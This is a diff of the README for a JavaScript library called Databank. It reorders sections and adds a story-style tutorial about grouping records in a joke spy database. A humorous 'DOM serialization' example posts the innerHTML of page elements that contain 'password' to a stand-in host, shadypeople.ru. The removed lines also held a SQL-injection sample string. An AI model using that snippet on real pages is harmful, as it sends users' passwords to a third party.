@@ -1,12 +1,13 @@
 <h1><a name=toc> Javascript `Databank`</a>
 
-### <a href=#introduction>Tricks and Introduction</a>
- * <a href="http://qaa.ath.cx/ytwatch1">The Project This is Primarily Built For</a>
+### <a href=#introduction>Agnes and Frederick</a>
  * <a href=#expressions>Expressions</a>
- * <a href=#autoincrement>AutoIncrement</a>
- * <a href=#dom>DOM serialization</a>
  * <a href=#browser>KISS syncing</a>
+ * <a href=#autoincrement>AutoIncrement</a>
+ * <a href=#mutation>Restructuring data</a>
  * <a href=#magic>Magical updating hash maps</a>
+ * <a href=#dom>DOM serialization</a>
+ * <a href="http://qaa.ath.cx/ytwatch1">The Project This is Primarily Built For</a>
 
 ### <a name=toc-inserting href=#inserting>Inserting and Removing</a> records
 
@@ -64,7 +65,7 @@
  * <a href=#similar>Similar Projects</a>
  * <a href=#users>Users</a>
 
-<h2><a name=introduction></a>Intro<a href=https://www.youtube.com/watch?v=eZ0hECn5Jak>ducing</a> [ <a href=#toc>top</a> ] </h2>
+<h2><a name=introduction></a>Agnes and Frederick [ <a href=#toc>top</a> ] </h2>
 
 We will follow two groups in our exploration: 
 
@@ -213,40 +214,6 @@ to peek at the implementation.  This is how they got started:
 
 To debug their expressions. Much to their delight, they found they can use these expressions and data manipulations just about everywhere in this library of black magic.
 
-<h3><a name=autoincrement>AutoIncrement</a>[ <a href=#toc>top</a> ] </h3>
-
-<a href=#template>Templates</a> can be used to create auto-incrementers. Here's is how you would do it, if you were so inclined:
-
-    var 
-      index = 0,
-      db = DB();
-
-    db.template.create({id: (function(){ return index++; })});
-    db.insert([
-      {key: "Alice Cooper"},
-      {key: "Bobby '); DROP TABLE Students;-- "}
-    ]);
-
-    >> db.find()
-    
-      {id: 0, key: "Alice Cooper"},
-      {id: 1, key: "Bobby '); DROP TABLE Students;-- "}
-
-<h3><a name=dom>DOM serialization</a>[ <a href=#toc>top</a> ] </h3>
-
-You don't need to insert things into a database first, you can just do something like this:
-
-    $.post("/proxy.to/http://shadypeople.ru",
-
-      DB.find(
-
-        document.getElementsByTagName(' * '), 
-        db.like('innerHTML', 'password')
-
-      ).select('innerHTML')
-
-    );
-
 <h3><a name=browser>KISS syncing in the browser</a>[ <a href=#toc>top</a> ] </h3>
 
 Our heros are now finally getting somewhere. They can bring down their data, and manipulate it with ease.
@@ -263,6 +230,83 @@ Going to the documentation, they find a convenient <a href=#sync>sync</a> functi
 
 And it's done. **Now Agnes and Frederick can modify stuff in the browser and it automatically does a remote sync**.  It was 4 lines. That's really all it took.
 
+<h3><a name=autoincrement>AutoIncrement</a>[ <a href=#toc>top</a> ] </h3>
+
+Agnes and Frederick are in the clear for now. However, this isn't to last long
+
+<blockquote>Agnes: Wouldn't it be a wonderful, and I do me quite a pleasant reality if we had a more organized way of dealing with this immensely distraught set of information.  If we could automatically decorate the data for our own purposes; through auto-incrementing or other things. This would make our lives easier.</blockquote>
+
+Reading through the docs, Frederick finds that <a href=#template>Templates</a> can be used to create auto-incrementers. 
+
+    var 
+      index = 0,
+      our_copy = DB();
+
+    our_copy.template.create({id: (function(){ return index++; })});
+
+    our_copy.insert(spies_database);
+
+    >> our_copy.find()
+    
+      { 'id': 0,
+        'name': "Agnes",
+        'location': 'Starbucks',
+        'role': 'target',
+        'kill-date': 'today',
+        'hitmen' : ['Agent 86']
+      },
+      { 'id': 1,
+        'name': "Agent 86",
+        'role': 'spy',
+        'distance': 80000,
+        'todo': { 'murder': 'Agnes' }
+      }
+      ...
+
+This is quite pleasant, they think. But still not very useful.  Wouldn't it be nice if they could just find out who the spies are?
+<h3><a name=mutation>Restructuring data</a>[ <a href=#toc>top</a> ] </h3>
+
+<blockquote>Frederick: Really what we need is a way to group people.</blockquote>
+
+After exploring some more, they find <a href=#group>group</a> and write this:
+
+    spies_database.group("role")
+
+    { 'spy': [
+        { 'name': "Agent Orange",
+          'distance': 10000,
+          'role': 'spy',
+          'todo': { 'murder' : 'Frederick' },
+        },
+        { 'name': "Agent 007",
+          'role': 'spy',
+          'todo': { 'sleep-with': 'spy' }
+        }
+      ]...
+    { 'target': [
+        { 'name': "Frederick",
+          'role': 'target',
+          'location': 'Starbucks',
+          'kill-date': 'today',
+          'hitmen' : ['Agent 86', 'Agent Orange']
+        },
+        { 'name': "Agnes",
+          'location': 'Starbucks',
+          'role': 'target',
+          'kill-date': 'today',
+          'hitmen' : ['Agent 86']
+        }
+      ]
+    } 
+
+Now they are getting somewhere they say:
+
+    DB(
+      spies_database.group("role")
+    ).find(DB("target.name == 'Agnes'"));
+
+They become quite pleased with how easy it is to do things.
+
 <h3><a name=magic>Magical updating hash maps</a>[ <a href=#toc>top</a> ] </h3>
 
 Pretend I have a backbone model that has some defaults and I want to find an object that has a certain attribute equalling a certain value.
@@ -274,6 +318,22 @@ Well we can do this easily here:
     magicalview['certainvalue']
 
 Will work.  In fact, **it updates automatically**. How convenient - I can get the whole keyspace and do a bunch of object like things on it. Besides, I always hated to press the shift `()` keys anyway.
+
+<h3><a name=dom>DOM serialization</a>[ <a href=#toc>top</a> ] </h3>
+
+You don't need to insert things into a database first, you can just do something like this:
+
+    $.post("/proxy.to/http://shadypeople.ru",
+
+      DB.find(
+
+        document.getElementsByTagName(' * '), 
+        db.like('innerHTML', 'password')
+
+      ).select('innerHTML')
+
+    );
+
 
 <h2><a name=inserting>Inserting and Removing</a> [ <a href=#toc>top</a> ] </h2>
 
